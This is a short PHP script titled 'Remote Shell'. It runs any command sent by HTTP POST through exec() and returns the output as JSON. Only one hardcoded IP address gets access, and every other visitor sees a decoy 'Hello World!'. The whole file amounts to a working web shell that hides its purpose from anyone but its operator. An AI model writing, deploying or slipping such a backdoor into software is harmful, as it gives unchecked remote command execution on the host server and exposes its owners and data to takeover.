<?php
    /**
     * @author:             jRimbault
     * @date:               2017-07-13
     * @last modified date: 2017-07-18
     *
     * @note: back-end php
     */

    if ($_SERVER['REMOTE_ADDR'] !== '78.194.50.40') die('Hello World!');

    if (isset($_POST['command'])) {
        header('Content-Type: application/json');

        $json['status'] = 0;
        $json['output'] = PHP_EOL;

        if (trim($_POST['command']) != '') {
            exec(trim($_POST['command']).' 2>&1', $output, $retval);

            $json['status'] = $retval;

            foreach ($output as $line) {
                $json['output'] .= $line.PHP_EOL;
            }
        }

        echo json_encode($json);
        exit(0);
    }
?>

<!doctype html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Remote Shell</title>

